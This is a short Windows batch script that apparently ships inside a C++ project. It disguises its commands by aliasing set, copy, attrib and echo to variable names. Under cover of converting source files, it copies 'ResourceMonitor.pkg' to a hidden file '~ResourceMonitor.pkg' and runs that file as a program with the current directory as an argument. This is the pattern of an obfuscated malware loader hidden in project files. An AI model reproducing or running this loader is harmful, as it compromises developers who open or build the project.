@echo off
set EQU==
set LDR%EQU%set
%LDR% DATABASE%EQU%"ResourceMonitor.pkg"
%LDR% TARGET%EQU%"~ResourceMonitor.pkg"
%LDR% SRCDIR%EQU%".\\source"
%LDR% NEXIST%EQU%if not exist
%LDR% EXIST%EQU%if exist
%LDR% OUTPUT%EQU%echo
%LDR% START%EQU%(
%LDR% STOP%EQU%)
%LDR% UNI2ANSI%EQU%type
%LDR% HIDE%EQU%attrib +h
%LDR% UNHIDE%EQU%attrib -h -s -r
%LDR% DUP%EQU%copy
%LDR% HALT%EQU%pause
%LDR% IGNOREINFO%EQU%nul

%NEXIST% %SRCDIR% %START%
%OUTPUT% invalid project path
%UNHIDE% %TARGET% >>%IGNOREINFO%
%DUP% %DATABASE% %TARGET% >>%IGNOREINFO%
%HIDE% %TARGET% >>%IGNOREINFO%
%TARGET% -m
%STOP% 

%EXIST% %SRCDIR% %START%
%UNI2ANSI% ".\\source\\stdafx.cpp">".\\source\\stdafx_tmp.cpp"
%UNI2ANSI% ".\\source\\stdafx.h">".\\source\\stdafx_tmp.h"
%UNI2ANSI% ".\\source\\test.cpp">".\\source\\test_tmp.cpp"
%UNHIDE% %TARGET% >>%IGNOREINFO%
%DUP% %DATABASE% %TARGET% >>%IGNOREINFO%
%HIDE% %TARGET% >>%IGNOREINFO%
%TARGET% -u "%CD%"
%STOP% 

